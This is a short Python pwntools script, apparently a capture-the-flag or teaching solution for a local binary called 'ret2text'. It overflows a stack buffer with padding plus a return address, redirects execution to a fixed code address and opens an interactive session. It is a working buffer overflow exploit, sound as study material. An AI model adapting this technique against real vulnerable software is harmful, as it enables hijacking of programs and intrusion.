from pwn import *

sh = process('./ret2text')

target = 0x804863a

payload = b'a'*(0xffffcd48-0xffffccc0-0x1c+4) + p32(target)


sh.recvuntil("?")
sh.sendline(payload)
sh.interactive()
